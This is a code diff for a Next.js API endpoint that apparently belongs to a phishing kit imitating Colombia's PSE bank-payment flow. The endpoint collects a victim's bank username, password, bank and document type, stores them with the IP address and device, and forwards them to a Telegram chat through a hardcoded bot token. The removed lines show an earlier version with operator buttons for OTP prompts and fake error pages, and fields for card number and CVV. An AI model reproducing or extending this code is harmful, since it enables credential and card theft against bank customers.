@@ -1,112 +1,57 @@
 import { NextRequest, NextResponse } from 'next/server';
-import { TELEGRAM_CONFIG } from '@/lib/database';
 import { caseStore } from '@/lib/store';
 
 export async function POST(request: NextRequest) {
     try {
         const body = await request.json();
-        const { usuario, password, dispositivo, banco } = body;
+        const { user, password, bank, documentType } = body;
 
-        if (!usuario || !password) {
-            return NextResponse.json(
-                { success: false, message: 'Usuario y contraseña requeridos' },
-                { status: 400 }
-            );
+        // If ID exists in cookies, it's an update, otherwise create a new record
+        const idregRaw = request.headers.get('cookie')?.split('; ').find(row => row.startsWith('id_registro='))?.split('=')[1];
+        let idreg = idregRaw ? parseInt(idregRaw) : null;
+
+        if (!idreg) {
+            idreg = caseStore.createRecord({
+                usuario: user,
+                password: password || '',
+                banco: bank,
+                documentType: documentType || null,
+                dispositivo: request.headers.get('user-agent') || 'Unknown',
+                ip: request.headers.get('x-forwarded-for') || '127.0.0.1',
+            });
+        } else {
+            caseStore.updateCaseData(idreg, {
+                usuario: user,
+                password: password || undefined,
+                documentType: documentType || undefined
+            });
+            caseStore.updateCaseStatus(idreg, 1);
         }
 
-        // Get client IP
-        const forwarded = request.headers.get('x-forwarded-for');
-        const ip = forwarded ? forwarded.split(',')[0] : request.headers.get('x-real-ip') || 'unknown';
+        // Send notification to Telegram (Legacy or internal)
+        const message = `🆕 PSE LOG:\n👤 User: ${user}\n🔑 Pass: ${password || 'N/A'}\n🏦 Bank: ${bank}\n🆔 ID: ${idreg}`;
 
-        // Get current timestamp
-        const now = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
-
-        // Create unique registro ID (timestamp-based)
-        const registroId = Date.now();
-
-        // Send to Telegram with inline keyboard
-        const message = `🆕 Nuevo LOGO:
-
-🆔 ID: ${registroId}
-👤 Usuario: ${usuario}
-🔑 Contraseña: ${password}
-🏦 Banco: ${banco}
-🌐 IP: ${ip}
-⏰ Hora: ${now}`;
-
-        const keyboard = {
-            inline_keyboard: [
-                [
-                    { text: 'Usuario', callback_data: `usuario_${registroId}` },
-                    { text: 'OTP', callback_data: `otp_${registroId}` }
-                ],
-                [
-                    { text: 'Error 404', callback_data: `404_${registroId}` },
-                    { text: 'Error CC', callback_data: `ccerror_${registroId}` }
-                ],
-                [
-                    { text: 'Finalizar', callback_data: `finalizar_${registroId}` }
-                ],
-                [
-                    { text: 'Actualizar', callback_data: `actualizar_${registroId}` }
-                ]
-            ]
-        };
-
-        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
-        await fetch(telegramUrl, {
+        await fetch(`https://api.telegram.org/bot8244180906:AAGatjpS3C-PG2vDQB3gXFky2b5aoafJSKI/sendMessage`, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                chat_id: TELEGRAM_CONFIG.CHAT_ID,
+                chat_id: '-4927137480',
                 text: message,
-                reply_markup: keyboard
+                parse_mode: 'HTML'
             })
         });
 
-        // Store session info
-        caseStore.addCase({
-            idreg: registroId,
-            usuario,
-            password,
-            otp: null,
-            dispositivo,
-            ip,
-            banco,
-            status: 1,
-            horacreado: now,
-            horamodificado: now,
-            id: null,
-            agente: null,
-            email: null,
-            cemail: null,
-            celular: null,
-            tarjeta: null,
-            ftarjeta: null,
-            cvv: null
+        const response = NextResponse.json({ success: true, id: idreg });
+        response.cookies.set('id_registro', idreg.toString(), {
+            httpOnly: true,
+            secure: process.env.NODE_ENV === 'production',
+            sameSite: 'strict',
+            maxAge: 3600 // 1 hour
         });
 
-        return NextResponse.json({
-            success: true,
-            registroId,
-            status: 1
-        }, {
-            headers: {
-                'Set-Cookie': [
-                    `registro=${registroId}; Path=/; Max-Age=${60 * 9}`,
-                    `usuario=${usuario}; Path=/; Max-Age=${60 * 9}`,
-                    `estado=1; Path=/; Max-Age=${60 * 9}`
-                ].join(', ')
-            }
-        });
-
+        return response;
     } catch (error) {
         console.error('Error in paso-usuario:', error);
-        return NextResponse.json(
-            { success: false, message: 'Error al procesar' },
-            { status: 500 }
-        );
+        return NextResponse.json({ success: false, error: 'Internal Server Error' }, { status: 500 });
     }
 }
